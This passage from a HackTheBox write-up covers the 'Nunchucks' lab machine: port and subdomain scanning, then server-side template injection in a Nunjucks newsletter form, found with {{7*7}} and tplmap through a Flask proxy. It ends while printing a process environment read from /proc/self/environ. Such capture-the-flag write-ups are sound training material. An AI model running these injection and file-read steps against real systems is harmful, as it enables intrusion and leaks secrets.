id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Nunchucks</h1><p class=post-description>SSTI in Nunjucks and SUID capability on Perl</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>November 07, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#http---https aria-label="HTTP -&amp;gt; HTTPS">HTTP -> HTTPS</a></li><li><a href=#nunchuckshtb aria-label=nunchucks.htb>nunchucks.htb</a></li><li><a href=#subdomain-fuzz aria-label="Subdomain Fuzz">Subdomain Fuzz</a></li><li><a href=#storenunchuckshtb aria-label=store.nunchucks.htb>store.nunchucks.htb</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#ssti aria-label=SSTI>SSTI</a></li><li><a href=#shell-as-david aria-label="Shell as david">Shell as david</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406_hu4354310b7e64106470299565851d7854_104584_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406_hu4354310b7e64106470299565851d7854_104584_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406_hu4354310b7e64106470299565851d7854_104584_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406.png 875w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406.png alt width=875 height=645></figure><p>Nunchucks features a NodeJS website that uses <a href=https://mozilla.github.io/nunjucks/>Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p><p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Web enumeration</li><li>SSTI on Nunjucks</li><li>Creating tplmap middleware using Flask</li><li>Exploiting <code>cap_setuid</code> on Perl</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Tplmap</li><li>Flask</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ fscan 10.10.11.122 nunchucks
</span></span><span class=line><span class=cl>nmap -p- 10.10.11.122 <span class=p>|</span> grep <span class=s1>&#39;^[0-9]&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f1 <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/,$//&#39;</span>
</span></span><span class=line><span class=cl>nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-11-05 07:12 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.122
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.14s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp  open  http     nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
</span></span><span class=line><span class=cl>443/tcp open  ssl/http nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Nunchucks - Landing Page
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>nunchucks.htb/organizationName<span class=o>=</span>Nunchucks-Certificates/stateOrProvinceName<span class=o>=</span>Dorset/countryName<span class=o>=</span>UK
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-08-30T15:42:24
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2031-08-28T15:42:24
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span> tls-nextprotoneg: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 16.77 seconds
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class=p>|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=http---https>HTTP -> HTTPS<a class=anchor aria-hidden=true href=#http---https>#</a></h3><p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ curl -I http://nunchucks.htb/ 
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>301</span> Moved Permanently
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Date: Fri, <span class=m>05</span> Nov <span class=m>2021</span> 11:51:32 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html
</span></span><span class=line><span class=cl>Content-Length: <span class=m>178</span>
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>Location: https://nunchucks.htb/
</span></span></code></pre></div><h3 id=nunchuckshtb>nunchucks.htb<a class=anchor aria-hidden=true href=#nunchuckshtb>#</a></h3><p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p><p><div class=img-container><img src=imgs/image-20211105185410047.png alt=image-20211105185410047></div></p><p>At the bottom of the page, there is an email, also it says it will have a store soon.</p><p><div class=img-container><img src=imgs/image-20211105190058511.png alt=image-20211105190058511></div></p><p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p><p><div class=img-container><img src=imgs/image-20211105185340514.png alt=image-20211105185340514></div></p><p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p><p><div class=img-container><img src=imgs/image-20211105185906028.png alt=image-20211105185906028></div></p><p>I&rsquo;ll send this request to repeater just in case, and then forward it</p><p><div class=img-container><img src=imgs/image-20211105185921036.png alt=image-20211105185921036></div></p><p>But then, the returned response states that registration is closed</p><p><div class=img-container><img src=imgs/image-20211105190014496.png alt=image-20211105190014496></div></p><p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p><p><div class=img-container><img src=imgs/image-20211105190246106.png alt=image-20211105190246106></div></p><p>Sending a malformed input breaks the parser and leaks the web directory.</p><p><div class=img-container><img src=imgs/image-20211105190735552.png alt=image-20211105190735552></div></p><p>Nothing else to try here.</p><h3 id=subdomain-fuzz>Subdomain Fuzz<a class=anchor aria-hidden=true href=#subdomain-fuzz>#</a></h3><p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ ffuf -k -u https://nunchucks.htb -H <span class=s2>&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class=m>200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class=m>547</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.3.0-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : https://nunchucks.htb
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl> :: Header           : Host: FUZZ.nunchucks.htb
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: <span class=m>200</span>
</span></span><span class=line><span class=cl> :: Filter           : Response lines: <span class=m>547</span>
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>store                   <span class=o>[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class=o>]</span>
</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>4989/4989<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>269</span> req/sec :: Duration: <span class=o>[</span>0:00:22<span class=o>]</span> :: Errors: <span class=m>0</span> ::
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class=p>|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id=storenunchuckshtb>store.nunchucks.htb<a class=anchor aria-hidden=true href=#storenunchuckshtb>#</a></h3><p>Store is not available, but I can subscribe for newsletter.</p><p><div class=img-container><img src=imgs/image-20211105191702728.png alt=image-20211105191702728></div></p><p>When I submit an email address there, it reflects the address back.</p><p><div class=img-container><img src=imgs/image-20211105191708337.png alt=image-20211105191708337></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=ssti>SSTI<a class=anchor aria-hidden=true href=#ssti>#</a></h3><h4 id=identify>Identify<a class=anchor aria-hidden=true href=#identify>#</a></h4><p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p><p><div class=img-container><img src=imgs/image-20211105191824204.png alt=image-20211105191824204></div></p><blockquote><p>The email validation is on client-side.</p></blockquote><h4 id=creating-middleware-for-tplmap-with-flask>Creating Middleware for tplmap with Flask<a class=anchor aria-hidden=true href=#creating-middleware-for-tplmap-with-flask>#</a></h4><p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.>here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p><p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.htb</code>. Here&rsquo;s the code:</p><script type=application/javascript src=https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js></script><blockquote><p>If you&rsquo;re having trouble with tplmap, maybe this post <a href=https://fahmifj.github.io/blog/tplmap-install/>here</a> could resolve it.</p></blockquote><p>I&rsquo;ll run the middleware.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«exploitsÂ» Â«10.10.14.46Â»
</span></span><span class=line><span class=cl>$ python3 middleware.py
</span></span><span class=line><span class=cl> * Serving Flask app <span class=s2>&#34;middleware&#34;</span> <span class=o>(</span>lazy loading<span class=o>)</span>
</span></span><span class=line><span class=cl> * Environment: production
</span></span><span class=line><span class=cl>   WARNING: This is a development server. Do not use it in a production deployment.
</span></span><span class=line><span class=cl>   Use a production WSGI server instead.
</span></span><span class=line><span class=cl> * Debug mode: off
</span></span><span class=line><span class=cl> * Running on http://0.0.0.0:80/ <span class=o>(</span>Press CTRL+C to quit<span class=o>)</span>
</span></span></code></pre></div><p>Then I will point <code>tplmap</code> to the middleware.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>tplmap-venv<span class=o>)</span> â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â»
</span></span><span class=line><span class=cl>$ ./tplmap.py -u <span class=s1>&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span></code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p><p><div class=img-container><img src=imgs/image-20211105213721440.png alt=image-20211105213721440></div></p><p>After a few sec later, <code>tplmap</code> finally got it right.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>tplmap-venv<span class=o>)</span> â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:<span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ ./tplmap.py -u <span class=s1>&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap 0.5
</span></span><span class=line><span class=cl>    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Testing <span class=k>if</span> GET parameter <span class=s1>&#39;email&#39;</span> is injectable
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Nunjucks plugin is testing rendering with tag <span class=s1>&#39;{{*}}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Nunjucks plugin has confirmed injection with tag <span class=s1>&#39;{{*}}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap identified the following injection point:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  GET parameter: email
</span></span><span class=line><span class=cl>  Engine: Nunjucks
</span></span><span class=line><span class=cl>  Injection: <span class=o>{{</span>*<span class=o>}}</span>
</span></span><span class=line><span class=cl>  Context: text
</span></span><span class=line><span class=cl>  OS: linux
</span></span><span class=line><span class=cl>  Technique: render
</span></span><span class=line><span class=cl>  Capabilities:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Shell <span class=nb>command</span> execution: no
</span></span><span class=line><span class=cl>   Bind and reverse shell: no
</span></span><span class=line><span class=cl>   File write: ok
</span></span><span class=line><span class=cl>   File read: ok
</span></span><span class=line><span class=cl>   Code evaluation: ok, javascript code
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Rerun tplmap providing one of the following options:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    --upload LOCAL REMOTE       Upload files to the server
</span></span><span class=line><span class=cl>    --download REMOTE LOCAL     Download remote files
</span></span></code></pre></div><p>Based on the <code>tplmap</code> results, it seems that command execution is not possible.</p><h4 id=grabbing-the-flag>Grabbing The Flag<a class=anchor aria-hidden=true href=#grabbing-the-flag>#</a></h4><p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>tplmap-venv<span class=o>)</span> â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:<span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ ./tplmap.py -u <span class=s1>&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class=s1>&#39;/proc/self/environ&#39;</span> <span class=s1>&#39;loot/dl_environ&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap 0.5
</span></span><span class=line><span class=cl>    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Testing <span class=k>if</span> GET parameter <span class=s1>&#39;email&#39;</span> is injectable
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Nunjucks plugin is testing rendering with tag <span class=s1>&#39;{{*}}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Nunjucks plugin has confirmed injection with tag <span class=s1>&#39;{{*}}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap identified the following injection point:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  GET parameter: email
</span></span><span class=line><span class=cl>  Engine: Nunjucks
</span></span><span class=line><span class=cl>  Injection: <span class=o>{{</span>*<span class=o>}}</span>
</span></span><span class=line><span class=cl>  Context: text
</span></span><span class=line><span class=cl>  OS: linux
</span></span><span class=line><span class=cl>  Technique: render
</span></span><span class=line><span class=cl>  Capabilities:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Shell <span class=nb>command</span> execution: no
</span></span><span class=line><span class=cl>   Bind and reverse shell: no
</span></span><span class=line><span class=cl>   File write: ok
</span></span><span class=line><span class=cl>   File read: ok
</span></span><span class=line><span class=cl>   Code evaluation: ok, javascript code
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>][</span>plugin<span class=o>]</span> Remote file md5 mismatch, check manually
</span></span></code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:<span class=o>(</span>master<span class=o>)</span> âœ— 
</span></span><span class=line><span class=cl>$ cat loot/dl_environ <span class=p>|</span> tr <span class=s1>&#39;,&#39;</span> <span class=s1>&#39;\n&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>LANG</span><span class=o>=</span>en_GB.UTF-8PATH<span class=o>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class=o>=</span>/home/david/.pm2/pm2.pidHOME<span class=o>=</span>/home/davidLOGNAME<span class=o>=</span><span class=nv>davidUSER</span><span class=o>=</span><span class=nv>davidSHELL</span><span class=o>=</span>/bin/bashINVOCATION_ID<span class=o>=</span><span class=nv>c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class=o>=</span>9:34693PM2_USAGE<span class=o>=</span><span class=nv>CLIPM2_HOME</span><span class=o>=</span>/home/david/.pm2SILENT<span class=o>=</span><span class=nv>truewindowsHide</span><span class=o>=</span><span class=nv>truepm2_env</span><span class=o>={</span><span class=s2>&#34;kill_retry_time&#34;</span>:100
</span></span><span class=line><span class=cl><span class=s2>&#34;windowsHide&#34;</span>:true
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span>:<span class=s2>&#34;david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;treekill&#34;</span>:true
</span></span><span class=line><span class=cl><span class=s2>&#34;automation&#34;</span>:true
</span></span><span class=line><span class=cl><span class=s2>&#34;pmx&#34;</span>:true
</span></span><span class=line><span class=cl><span class=s2>&#34;instance_var&#34;</span>:<span class=s2>&#34;NODE_APP_INSTANCE&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;watch&#34;</span>:false
</span></span><span class=line><span class=cl><span class=s2>&#34;autorestart&#34;</span>:true
</span></span><span class=line><span class=cl><span class=s2>&#34;vizion&#34;</span>:true
</span></span><span class=line><span class=cl><span class=s2>&#34;env&#34;</span>:<span class=o>{</span><span class=s2>&#34;PM2_USAGE&#34;</span>:<span class=s2>&#34;CLI&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;OLDPWD&#34;</span>:<span class=s2>&#34;/var/www&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;_&#34;</span>:<span class=s2>&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;MAIL&#34;</span>:<span class=s2>&#34;/var/mail/david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class=s2>&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PATH&#34;</span>:<span class=s2>&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;HUSHLOGIN&#34;</span>:<span class=s2>&#34;FALSE&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;JOURNAL_STREAM&#34;</span>:<span class=s2>&#34;9:35778&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_RUNTIME_DIR&#34;</span>:<span class=s2>&#34;/run/user/1000&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SESSION_ID&#34;</span>:<span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_VTNR&#34;</span>:<span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;SHLVL&#34;</span>:<span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;USER&#34;</span>:<span class=s2>&#34;david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LESSOPEN&#34;</span>:<span class=s2>&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;TERM&#34;</span>:<span class=s2>&#34;linux&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SESSION_CLASS&#34;</span>:<span class=s2>&#34;user&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LESSCLOSE&#34;</span>:<span class=s2>&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;INVOCATION_ID&#34;</span>:<span class=s2>&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LS_COLORS&#34;</span>:<span class=s2>&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35: